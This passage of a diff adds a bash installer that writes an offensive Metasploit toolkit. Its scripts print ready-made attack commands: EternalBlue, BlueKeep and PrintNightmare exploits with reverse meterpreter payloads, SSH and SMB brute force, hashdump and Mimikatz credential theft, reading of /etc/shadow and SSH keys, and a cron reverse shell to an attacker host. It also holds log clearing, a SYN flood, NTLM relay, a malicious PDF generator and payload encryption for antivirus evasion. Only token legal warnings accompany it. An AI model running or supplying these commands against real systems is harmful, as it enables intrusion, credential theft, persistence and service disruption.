+  hosts; services; vulns              # View results
+── EXPLOIT ──
+  search smb                          # Find SMB exploits
+  use exploit/windows/smb/ms17_010_eternalblue
+  set RHOSTS <IP>; set LHOST <IP>; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+  exploit -j                          # Run as job
+── POST ──
+  sessions -i 1; getsystem; hashdump
+  load kiwi; creds_all
+  run autoroute -s 10.0.0.0/24        # Pivot
+── MSFVENOM ──
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o p.exe
+  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o p.elf
+CHEAT
+CHTEOMAIN
+
+    log "msf-run.sh, c2-run.sh, msf-ai.sh, msf-cheatsheet.sh written"
+
+
+    # ──────────────────────────────────────────────────────────────────
+    # MODULES: scanner/* (7 files)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/modules/scanner/smb/smb_scanner.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: SMB enumeration — version, shares, users, MS17-010 check
+TARGET="${1:-}"; [[ -z "$TARGET" ]] && { echo "Usage: bash smb_scanner.sh <RHOSTS>"; echo "  bash smb_scanner.sh 192.168.1.0/24"; exit 1; }
+echo -e "\n=== SMB SCANNER — $TARGET ===\n"
+echo "[*] SMB Version:"; echo "  use auxiliary/scanner/smb/smb_version; set RHOSTS $TARGET; set THREADS 10; run"
+echo "[*] SMB Shares:"; echo "  use auxiliary/scanner/smb/smb_enumshares; set RHOSTS $TARGET; set ShowFiles true; run"
+echo "[*] SMB Users:"; echo "  use auxiliary/scanner/smb/smb_enumusers; set RHOSTS $TARGET; run"
+echo "[*] MS17-010 Check:"; echo "  use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $TARGET; run"
+echo "[*] SMB2 Signing:"; echo "  use auxiliary/scanner/smb/smb2; set RHOSTS $TARGET; run"
+echo "[*] SMB Login (brute):"; echo "  use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser administrator; set PASS_FILE /usr/share/seclists/10k-most-common.txt; run"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/scanner/http/http_scanner.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: HTTP server scanning — version, methods, directories, SSL
+TARGET="${1:-}"; [[ -z "$TARGET" ]] && { echo "Usage: bash http_scanner.sh <RHOSTS>"; echo "  bash http_scanner.sh 192.168.1.10"; exit 1; }
+echo -e "\n=== HTTP SCANNER — $TARGET ===\n"
+echo "[*] HTTP Version:"; echo "  use auxiliary/scanner/http/http_version; set RHOSTS $TARGET; set RPORT 80,443,8080,8443; run"
+echo "[*] Options Method:"; echo "  use auxiliary/scanner/http/options; set RHOSTS $TARGET; run"
+echo "[*] Directory Scan:"; echo "  use auxiliary/scanner/http/dir_scanner; set RHOSTS $TARGET; set DICTIONARY /usr/share/seclists/Discovery/Web-Content/common.txt; run"
+echo "[*] Apache UserDir:"; echo "  use auxiliary/scanner/http/apache_userdir_enum; set RHOSTS $TARGET; run"
+echo "[*] SSL Certificate:"; echo "  use auxiliary/gather/ssl_cert; set RHOSTS $TARGET; run"
+echo "[*] Apache OptionsBleed:"; echo "  use auxiliary/scanner/http/apache_optionsbleed; set RHOSTS $TARGET; run"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/scanner/ssh/ssh_scanner.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: SSH server scanning — version, user enumeration, brute force
+TARGET="${1:-}"; [[ -z "$TARGET" ]] && { echo "Usage: bash ssh_scanner.sh <RHOSTS>"; echo "  bash ssh_scanner.sh 192.168.1.0/24"; exit 1; }
+echo -e "\n=== SSH SCANNER — $TARGET ===\n"
+echo "[*] SSH Version:"; echo "  use auxiliary/scanner/ssh/ssh_version; set RHOSTS $TARGET; set THREADS 25; run"
+echo "[*] User Enumeration:"; echo "  use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS $TARGET; set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt; run"
+echo "[*] SSH Brute Force:"; echo "  use auxiliary/scanner/ssh/ssh_login; set RHOSTS $TARGET; set USERNAME root; set PASS_FILE /usr/share/seclists/10k-most-common.txt; set THREADS 10; run"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/scanner/network/arp_sweep.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: ARP sweep — discover live hosts on local network segment
+INTERFACE="${1:-eth0}"; RHOSTS="${2:-192.168.1.0/24}"
+echo -e "\n=== ARP SWEEP — $INTERFACE / $RHOSTS ===\n"
+echo "[*] msfconsole:"; echo "  use auxiliary/scanner/discovery/arp_sweep; set INTERFACE $INTERFACE; set RHOSTS $RHOSTS; set THREADS 50; run"
+echo "[*] nmap:"; echo "  nmap -sn $RHOSTS"
+echo "[*] arp-scan:"; echo "  sudo arp-scan --localnet --interface $INTERFACE"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/scanner/ssl/ssl_scanner.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: SSL/TLS vulnerability scanner — ciphers, protocols, certificate
+TARGET="${1:-}"; PORT="${2:-443}"
+[[ -z "$TARGET" ]] && { echo "Usage: bash ssl_scanner.sh <HOST> [PORT]"; echo "  bash ssl_scanner.sh target.com 443"; exit 1; }
+echo -e "\n=== SSL/TLS SCANNER — $TARGET:$PORT ===\n"
+echo "[*] SSLScan:"; echo "  sslscan $TARGET:$PORT"
+echo "[*] testssl.sh:"; echo "  testssl --full $TARGET:$PORT"
+echo "[*] nmap ssl-enum-ciphers:"; echo "  nmap --script ssl-enum-ciphers -p $PORT $TARGET"
+echo "[*] SSL Certificate (msf):"; echo "  use auxiliary/gather/ssl_cert; set RHOSTS $TARGET; set RPORT $PORT; run"
+echo "[*] Heartbleed check:"; echo "  nmap --script ssl-heartbleed -p $PORT $TARGET"
+echo "[*] POODLE check:"; echo "  nmap --script ssl-poodle -p $PORT $TARGET"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/scanner/vuln/vuln_scanner.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: NSE vulnerability scanning automation — targeted CVE checks
+TARGET="${1:-}"; [[ -z "$TARGET" ]] && { echo "Usage: bash vuln_scanner.sh <TARGET>"; echo "  bash vuln_scanner.sh 192.168.1.0/24"; exit 1; }
+echo -e "\n=== VULN SCANNER — $TARGET ===\n"
+echo "[*] Full NSE vuln:"; echo "  nmap --script vuln -sV -p- -T4 $TARGET -oA scans/vuln_scan"
+echo "[*] SMB vulns:"; echo "  nmap --script smb-vuln* -p 445 $TARGET"
+echo "[*] HTTP vulns:"; echo "  nmap --script http-vuln* -p 80,443,8080 $TARGET"
+echo "[*] RDP vulns:"; echo "  nmap --script rdp-vuln* -p 3389 $TARGET"
+echo "[*] MSF auto-vuln:"; echo "  use auxiliary/vulnerability_checker; set RHOSTS $TARGET; run"
+echo "[*] Nuclei scan:"; echo "  nuclei -u $TARGET -t cves/ -severity critical,high -o nuclei_results.txt"
+echo -e "\n=== DONE ===\n"
+EOF
+    log "scanner/* (7 files) written"
+
+    # ──────────────────────────────────────────────────────────────────
+    # MODULES: exploit/* (4 files)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/modules/exploit/windows/smb_exploits.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Windows SMB exploit — EternalBlue, MS08-067, PsExec
+RHOST="${1:-}"; LHOST="${2:-}"; LPORT="${3:-4444}"
+[[ -z "$RHOST" ]] && { echo "Usage: bash smb_exploits.sh <RHOST> <LHOST> [LPORT]"; echo "  bash smb_exploits.sh 10.0.0.50 192.168.1.100"; exit 1; }
+echo -e "\n=== WINDOWS SMB EXPLOITS — $RHOST ← $LHOST:$LPORT ===\n"
+echo -e "[*] Listener FIRST:"; echo "  use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit -j"
+echo ""
+echo -e "[*] EternalBlue (MS17-010):"; echo "  use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $RHOST; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit -j"
+echo ""
+echo -e "[*] MS08-067 NetAPI (XP/2003):"; echo "  use exploit/windows/smb/ms08_067_netapi; set RHOSTS $RHOST; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $LHOST; exploit"
+echo ""
+echo -e "[*] PsExec (credentials):"; echo "  use exploit/windows/smb/psexec; set RHOSTS $RHOST; set SMBUser <USER>; set SMBPass <PASS>; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; exploit"
+echo ""
+echo -e "[*] Pass the Hash:"; echo "  use exploit/windows/smb/psexec; set RHOSTS $RHOST; set SMBUser administrator; set SMBPass aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>; exploit"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/exploit/windows/rdp_exploits.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Windows RDP exploit — BlueKeep (CVE-2019-0708), PrintNightmare
+RHOST="${1:-}"; LHOST="${2:-}"
+[[ -z "$RHOST" ]] && { echo "Usage: bash rdp_exploits.sh <RHOST> <LHOST>"; echo "  bash rdp_exploits.sh 10.0.0.50 192.168.1.100"; exit 1; }
+echo -e "\n=== WINDOWS RDP EXPLOITS — $RHOST ← $LHOST ===\n"
+echo -e "[*] BlueKeep scan:"; echo "  use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS $RHOST; run"
+echo ""
+echo -e "[*] BlueKeep exploit:"; echo "  use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS $RHOST; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT 4444; exploit"
+echo ""
+echo -e "[*] PrintNightmare (CVE-2021-34527):"; echo "  use exploit/windows/print/cve_2021_34527; set RHOSTS $RHOST; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; exploit"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/exploit/linux/linux_exploits.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Linux exploit — SSH brute, vsftpd backdoor, PwnKit, DirtyPipe
+RHOST="${1:-}"; LHOST="${2:-}"
+[[ -z "$RHOST" ]] && { echo "Usage: bash linux_exploits.sh <RHOST> <LHOST>"; echo "  bash linux_exploits.sh 10.0.0.100 192.168.1.100"; exit 1; }
+echo -e "\n=== LINUX EXPLOITS — $RHOST ← $LHOST ===\n"
+echo -e "[*] SSH Brute Force:"; echo "  use exploit/linux/ssh/ssh_login; set RHOSTS $RHOST; set USERNAME root; set PASS_FILE /usr/share/seclists/10k-most-common.txt; run"
+echo ""
+echo -e "[*] vsftpd 2.3.4 Backdoor:"; echo "  use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $RHOST; exploit"
+echo ""
+echo -e "[*] PwnKit (CVE-2021-4034):"; echo "  use exploit/linux/local/pkexec; set SESSION <ID>; exploit"
+echo ""
+echo -e "[*] DirtyPipe (CVE-2022-0847):"; echo "  use exploit/linux/local/cve_2022_0847_dirtypipe; set SESSION <ID>; exploit"
+echo ""
+echo -e "[*] Baron Samedit (CVE-2021-3156):"; echo "  use exploit/linux/sudo/sudo_baron_samedit; set LHOST $LHOST; exploit"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/exploit/multi/multi_handler.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Multi/handler — catch reverse shells from all platforms
+LHOST="${1:-0.0.0.0}"; LPORT="${2:-4444}"; PAYLOAD="${3:-windows/x64/meterpreter/reverse_tcp}"
+echo -e "\n=== MULTI/HANDLER — $LHOST:$LPORT ($PAYLOAD) ===\n"
+echo "[*] msfconsole:"; echo "  use exploit/multi/handler; set PAYLOAD $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; exploit -j"
+echo ""
+echo "[*] HTTPS listener:"; echo "  set PAYLOAD windows/x64/meterpreter/reverse_https; set LPORT 443; set LURI /api/health; exploit -j"
+echo ""
+echo "[*] Check sessions:"; echo "  sessions -l; sessions -i 1"
+echo -e "\n=== DONE ===\n"
+EOF
+    log "exploit/* (4 files) written"
+
+    # ──────────────────────────────────────────────────────────────────
+    # MODULES: post/* (3 files)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/modules/post/windows/windows_post.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Windows post-exploitation — privesc, hashdump, kiwi, persistence
+SESSION="${1:-1}"
+echo -e "\n=== WINDOWS POST-EXPLOIT ===\n"
+echo "[*] Privilege Escalation:"; echo "  getsystem; getsystem -t 1; run post/multi/recon/local_exploit_suggester"
+echo "  background; use exploit/windows/local/bypassuac_eventvwr; set SESSION $SESSION; exploit"
+echo ""
+echo "[*] Credential Harvesting:"; echo "  hashdump; load kiwi; creds_all; lsa_dump_sam; lsa_dump_secrets"
+echo "  run post/windows/gather/hashdump; run post/windows/gather/credential_collector; run post/windows/gather/enum_chrome"
+echo ""
+echo "[*] Persistence:"; echo "  run persistence -X -i 60 -p windows/x64/meterpreter/reverse_tcp -r <LHOST>"
+echo "  use exploit/windows/local/service_persistence; set SESSION $SESSION; exploit"
+echo "  use exploit/windows/local/wmi_persistence; set SESSION $SESSION; exploit"
+echo ""
+echo "[*] Lateral Movement:"; echo "  run autoroute -s 10.0.0.0/24; run autoroute -p"
+echo "  use auxiliary/server/socks_proxy; set SRVPORT 1080; run"
+echo "  use exploit/windows/smb/psexec; set RHOSTS <INTERNAL>; set SMBUser <USER>; set SMBPass <HASH>; exploit"
+echo ""
+echo "[*] Cleanup:"; echo "  clearev; run post/windows/manage/cleanup"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/post/linux/linux_post.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Linux post-exploitation — privesc, credential harvesting, persistence
+SESSION="${1:-1}"
+echo -e "\n=== LINUX POST-EXPLOIT ===\n"
+echo "[*] Privilege Escalation:"; echo "  run post/multi/recon/local_exploit_suggester"
+echo "  use exploit/linux/local/sudo_baron_samedit; set SESSION $SESSION; exploit"
+echo "  sudo -l; find / -perm -4000 2>/dev/null; crontab -l"
+echo ""
+echo "[*] Credential Harvesting:"; echo "  cat /etc/shadow 2>/dev/null; cat /etc/passwd"
+echo "  cat ~/.ssh/id_rsa 2>/dev/null; cat ~/.bash_history; grep -r password /etc 2>/dev/null"
+echo "  run post/linux/gather/hashdump; run post/linux/gather/enum_users_history"
+echo ""
+echo "[*] Persistence (cron):"; echo "  echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"' | crontab -"
+echo "  echo '<PUBKEY>' >> ~/.ssh/authorized_keys"
+echo ""
+echo "[*] System Info:"; echo "  uname -a; cat /etc/os-release; ifconfig; netstat -tunlp; ps aux"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/post/persistence/persistence_menu.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Combined persistence reference — Windows + Linux
+echo -e "\n=== PERSISTENCE MENU (Windows + Linux) ===\n"
+echo "── Windows ──"
+echo "  run persistence -X -i 60 -p windows/x64/meterpreter/reverse_tcp -r <LHOST>"
+echo "  use exploit/windows/local/service_persistence"
+echo "  use exploit/windows/local/wmi_persistence"
+echo "  use exploit/windows/local/scheduled_task_persistence"
+echo "  use exploit/windows/local/registry_persistence"
+echo "  use exploit/windows/local/com_hijacking"
+echo "  run post/windows/manage/enable_rdp"
+echo ""
+echo "── Linux ──"
+echo "  echo '* * * * * <CMD>' | crontab -"
+echo "  echo '<PUBKEY>' >> ~/.ssh/authorized_keys"
+echo "  use exploit/linux/local/cron_persistence"
+echo "  use exploit/linux/local/systemd_persistence"
+echo "  run post/linux/manage/sshkey_persistence"
+echo -e "\n=== DONE ===\n"
+EOF
+    log "post/* (3 files) written"
+
+
+    # ──────────────────────────────────────────────────────────────────
+    # MODULES: gather/* (3 files)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/modules/gather/dns/dns_gather.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: DNS enumeration — brute force, zone transfer (AXFR), whois, dig
+DOMAIN="${1:-}"; [[ -z "$DOMAIN" ]] && { echo "Usage: bash dns_gather.sh <DOMAIN>"; echo "  bash dns_gather.sh target.com"; exit 1; }
+echo -e "\n=== DNS GATHER — $DOMAIN ===\n"
+echo "[*] DNS Brute Force:"; echo "  use auxiliary/gather/dns_brute; set DOMAIN $DOMAIN; set THREADS 25; run"
+echo "[*] Forward Lookup:"; echo "  use auxiliary/gather/dns_forward_lookup; set DOMAIN $DOMAIN; run"
+echo "[*] Zone Transfer (AXFR):"; echo "  dig @ns1.${DOMAIN} ${DOMAIN} AXFR"; echo "  host -l ${DOMAIN} ns1.${DOMAIN}"
+echo "[*] WHOIS:"; echo "  whois ${DOMAIN}"
+echo "[*] DNS Records:"; echo "  dig ${DOMAIN} ANY; dig ${DOMAIN} A; dig ${DOMAIN} MX; dig ${DOMAIN} NS; dig ${DOMAIN} SOA; dig ${DOMAIN} TXT"
+echo "[*] Subdomain tools:"; echo "  subfinder -d ${DOMAIN} -o subs.txt"; echo "  amass enum -d ${DOMAIN} -o amass.txt"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/gather/web/web_gather.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Web info gathering — headers, CMS detection, email harvesting
+TARGET="${1:-}"; [[ -z "$TARGET" ]] && { echo "Usage: bash web_gather.sh <URL>"; echo "  bash web_gather.sh https://target.com"; exit 1; }
+echo -e "\n=== WEB GATHER — $TARGET ===\n"
+echo "[*] HTTP Headers:"; echo "  curl -I $TARGET"; echo "  whatweb $TARGET"
+echo "[*] CMS Detection:"; echo "  whatweb --aggression 3 $TARGET"; echo "  wpscan --url $TARGET --enumerate p,t,u"
+echo "[*] Technology Stack:"; echo "  webanalyze -host \$(echo $TARGET | awk -F/ '{print \$3}')"
+echo "[*] Email Harvesting:"; echo "  use auxiliary/gather/search_email_collector; set DOMAIN \$(echo $TARGET | awk -F/ '{print \$3}'); run"
+echo "[*] Shodan:"; echo "  use auxiliary/gather/shodan_search; set QUERY hostname:\$(echo $TARGET | awk -F/ '{print \$3}'); run"
+echo "[*] Google Dorks:"; echo "  site:\$(echo $TARGET | awk -F/ '{print \$3}')"; echo "  site:\$(echo $TARGET | awk -F/ '{print \$3}') filetype:pdf"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/gather/email/email_harvest.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Email harvesting — theHarvester, Hunter.io, LinkedIn scraping
+DOMAIN="${1:-}"; [[ -z "$DOMAIN" ]] && { echo "Usage: bash email_harvest.sh <DOMAIN>"; echo "  bash email_harvest.sh target.com"; exit 1; }
+echo -e "\n=== EMAIL HARVEST — $DOMAIN ===\n"
+echo "[*] theHarvester:"; echo "  theHarvester -d $DOMAIN -b all -f harvester_results.html"
+echo "[*] Hunter.io (needs API):"; echo "  curl -s \"https://api.hunter.io/v2/domain-search?domain=$DOMAIN&api_token=\$HUNTER_API_KEY\""
+echo "[*] MSF Module:"; echo "  use auxiliary/gather/search_email_collector; set DOMAIN $DOMAIN; run"
+echo "[*] LinkedIn (manual recon):"; echo "  site:linkedin.com \"@${DOMAIN}\""
+echo "[*] Verify emails:"; echo "  use auxiliary/scanner/smtp/smtp_enum; set RHOSTS mail.${DOMAIN}; set USER_FILE emails.txt; run"
+echo -e "\n=== DONE ===\n"
+EOF
+    log "gather/* (3 files) written"
+
+    # ──────────────────────────────────────────────────────────────────
+    # MODULES: auxiliary/* (3 files)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/modules/auxiliary/dos/syn_flood.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: SYN flood attack reference — hping3, nmap, metasploit
+TARGET="${1:-}"; PORT="${2:-80}"
+[[ -z "$TARGET" ]] && { echo "Usage: bash syn_flood.sh <TARGET> [PORT]"; echo "  bash syn_flood.sh 192.168.1.50 80"; exit 1; }
+echo -e "\n=== SYN FLOOD — $TARGET:$PORT ===\n"
+echo "[*] hping3:"; echo "  sudo hping3 -S --flood -p $PORT $TARGET"
+echo "[*] nmap DoS:"; echo "  nmap --script dos -p $PORT $TARGET"
+echo "[*] MSF synflood:"; echo "  use auxiliary/dos/tcp/synflood; set RHOST $TARGET; set RPORT $PORT; run"
+echo -e "\n⚠️  LEGAL: Authorized testing ONLY. Unauthorized DoS is illegal.\n"
+EOF
+
+    cat > "$D/modules/auxiliary/fuzzers/http_fuzzer.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: HTTP parameter fuzzer — ffuf, wfuzz, gobuster for web vuln discovery
+TARGET="${1:-}"; PARAM="${2:-id}"
+[[ -z "$TARGET" ]] && { echo "Usage: bash http_fuzzer.sh <URL> [param]"; echo "  bash http_fuzzer.sh http://target.com/page.php?id=FUZZ id"; exit 1; }
+WORDLIST="/usr/share/seclists/Discovery/Web-Content/common.txt"
+echo -e "\n=== HTTP FUZZER — $TARGET?$PARAM=FUZZ ===\n"
+echo "[*] ffuf:"; echo "  ffuf -u \"${TARGET}?${PARAM}=FUZZ\" -w $WORDLIST -fc 404 -t 100"
+echo "[*] wfuzz:"; echo "  wfuzz -c -z file,$WORDLIST --hc 404 \"${TARGET}?${PARAM}=FUZZ\""
+echo "[*] gobuster fuzz:"; echo "  gobuster fuzz -u \"${TARGET}?${PARAM}=FUZZ\" -w $WORDLIST --exclude-length 0"
+echo "[*] ParamSpider:"; echo "  ParamSpider -d \$(echo $TARGET | awk -F/ '{print \$3}') -o params.txt"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    cat > "$D/modules/auxiliary/spoof/llmnr_spoof.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: LLMNR/NBT-NS/ARP spoofing — responder, mitm6 for NTLM hash capture
+IFACE="${1:-eth0}"; DOMAIN="${2:-}"
+echo -e "\n=== LLMNR/NBT-NS SPOOFING — $IFACE ===\n"
+echo "[*] Responder (NTLM hash capture):"; echo "  sudo responder -I $IFACE -wFbv -A"
+echo "[*] Responder + DHCP:"; echo "  sudo responder -I $IFACE -wdF"
+echo "[*] mitm6 (IPv6 takeover):"; echo "  sudo mitm6 -d ${DOMAIN:-corp.local} -i $IFACE"
+echo "[*] NTLM Relay (combine with responder):"; echo "  sudo impacket-ntlmrelayx -tf targets.txt -smb2support -of hashes.txt"
+echo "[*] ARP Spoof:"; echo "  sudo arpspoof -i $IFACE -t <TARGET_IP> <GATEWAY_IP>"
+echo -e "\n⚠️  Requires internal network access. LEGAL use only.\n"
+EOF
+    log "auxiliary/* (3 files) written"
+
+    # ──────────────────────────────────────────────────────────────────
+    # MODULES: evasion/rc4_packer.sh (NEW)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/modules/evasion/rc4_packer.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: RC4 payload packer — encrypt msfvenom payloads for AV evasion
+LHOST="${1:-}"; LPORT="${2:-4444}"; RC4_KEY="${3:-$(openssl rand -hex 8)}"
+[[ -z "$LHOST" ]] && { echo "Usage: bash rc4_packer.sh <LHOST> [LPORT] [RC4_KEY]"; echo "  bash rc4_packer.sh 192.168.1.100 4444 MySecretKey"; exit 1; }
+echo -e "\n=== RC4 PAYLOAD PACKER ===\n"
+echo "  LHOST=$LHOST  LPORT=$LPORT  KEY=$RC4_KEY"
+echo ""
+echo "── Linux ELF (RC4 encrypted) ──"
+echo "  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \\"
+echo "    -f elf --encrypt rc4 --encrypt-key $RC4_KEY -o payload_rc4_linux.elf"
+echo ""
+echo "── Windows EXE (RC4 encrypted) ──"
+echo "  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \\"
+echo "    -f exe --encrypt rc4 --encrypt-key $RC4_KEY -o payload_rc4_windows.exe"
+echo ""
+echo "── Windows DLL (RC4 encrypted) ──"
+echo "  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \\"
+echo "    -f dll --encrypt rc4 --encrypt-key $RC4_KEY -o payload_rc4.dll"
+echo ""
+echo "── Encoder chain + RC4 (double obfuscation) ──"
+echo "  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$LHOST LPORT=443 \\"
+echo "    -e x64/xor_dynamic -i 3 --encrypt rc4 --encrypt-key $RC4_KEY \\"
+echo "    -f exe -o payload_double_evasion.exe"
+echo ""
+echo "── Decrypt & Execute (in memory) ──"
+echo "  # Use: msfconsole + exploit/multi/handler with same RC4 key"
+echo ""
+echo -e "\n=== Generated with key: $RC4_KEY ===\n"
+echo "  Save this key! You need it to decrypt the payload in listener"
+EOF
+
+    # ──────────────────────────────────────────────────────────────────
+    # MODULES: kerberos/timeroasting.sh (NEW — Feature: Kerberos attacks)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/modules/kerberos/timeroasting.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Kerberos Timeroasting attack (CVE-2022-33679) — dump hashes without pre-auth
+DC_IP="${1:-}"; DOMAIN="${2:-}"; USERLIST="${3:-users.txt}"
+[[ -z "$DC_IP" ]] && { echo "Usage: bash timeroasting.sh <DC_IP> <DOMAIN> [userlist]"; echo "  bash timeroasting.sh 10.0.0.10 corp.local users.txt"; exit 1; }
+echo -e "\n=== KERBEROS TIMEROASTING — DC: $DC_IP | Domain: $DOMAIN ===\n"
+echo "[*] AS-REP Roasting (no creds needed):"; echo "  impacket-GetNPUsers -dc-ip $DC_IP -request -format hashcat ${DOMAIN}/${USERLIST}"
+echo "  # Or in msfconsole:"; echo "  use auxiliary/gather/asrep_roast; set DOMAIN $DOMAIN; set USER_FILE $USERLIST; run"
+echo ""
+echo "[*] Kerberoasting (if you have ANY domain user):"; echo "  impacket-GetUserSPNs -dc-ip $DC_IP ${DOMAIN}/user:pass -request -outputfile spn_hashes.txt"
+echo "  # Or in msfconsole:"; echo "  use auxiliary/gather/kerberoast; set DOMAIN $DOMAIN; set USERNAME user; set PASSWORD pass; run"
+echo ""
+echo "[*] Crack with hashcat:"; echo "  hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force"
+echo "  hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt --force"
+echo ""
+echo "[*] Pass the Ticket (if TGT obtained):"; echo "  export KRB5CCNAME=/tmp/ticket.ccache"; echo "  impacket-psexec -k -no-pass ${DOMAIN}/administrator@${DC_IP}"
+echo -e "\n=== DONE ===\n"
+EOF
+
+    # ──────────────────────────────────────────────────────────────────
+    # MODULES: relay/ntlm_relay.sh (NEW)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/modules/relay/ntlm_relay.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: NTLM relay attacks — relay to LDAP, MSSQL, SMB for privilege escalation
+TARGET="${1:-}"; ACTION="${2:-ldap}"; ESCALATE_USER="${3:-}"
+[[ -z "$TARGET" ]] && { echo "Usage: bash ntlm_relay.sh <TARGET> [ldap|mssql|smb] [escalate_user]"; echo "  bash ntlm_relay.sh 10.0.0.10 ldap Administrator"; exit 1; }
+echo -e "\n=== NTLM RELAY — Target: $TARGET | Action: $ACTION ===\n"
+echo "[*] Step 1: Start Responder (separate terminal):"; echo "  sudo responder -I eth0 -A"
+echo ""
+echo "[*] Step 2: Relay captured hashes:"
+case "$ACTION" in
+    ldap)
+        echo "  sudo impacket-ntlmrelayx -t ldap://$TARGET --escalate-user ${ESCALATE_USER:-Administrator} --dump-adcs"
+        echo "  # This adds the user to Enterprise Admins if ADCS is present" ;;
+    mssql)
+        echo "  sudo impacket-ntlmrelayx -t mssql://$TARGET -q"
+        echo "  # Execute SQL queries with relayed credentials" ;;
+    smb)
+        echo "  sudo impacket-ntlmrelayx -tf targets.txt -smb2support -of loot_hashes.txt"
+        echo "  # Relay to SMB, execute commands, dump hashes" ;;
+    *)
+        echo "  sudo impacket-ntlmrelayx -t ${ACTION}://$TARGET -smb2support" ;;
+esac
+echo ""
+echo "[*] Step 3: Process captured hashes:"; echo "  hashcat -m 5600 loot_hashes.txt /usr/share/wordlists/rockyou.txt --force"
+echo -e "\n⚠️  Internal network ONLY — requires MITM position\n"
+EOF
+
+    # ──────────────────────────────────────────────────────────────────
+    # MODULES: client_side/pdf_exploit.sh (NEW)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/modules/client_side/pdf_exploit.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Client-side exploit generator — malicious PDF with embedded payload
+LHOST="${1:-}"; LPORT="${2:-4444}"
+[[ -z "$LHOST" ]] && { echo "Usage: bash pdf_exploit.sh <LHOST> [LPORT]"; echo "  bash pdf_exploit.sh 192.168.1.100 4444"; exit 1; }
+echo -e "\n=== MALICIOUS PDF GENERATOR — $LHOST:$LPORT ===\n"
+echo "[*] PDF with Meterpreter:"; echo "  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f pdf -o exploit.pdf"
+echo ""
+echo "[*] PDF with embedded JavaScript:"; echo "  # Create malicious PDF with JavaScript payload"
+echo "  # Use: Metasploit auxiliary/gather/pdf_js_inject or custom PDF toolkit"
+echo ""
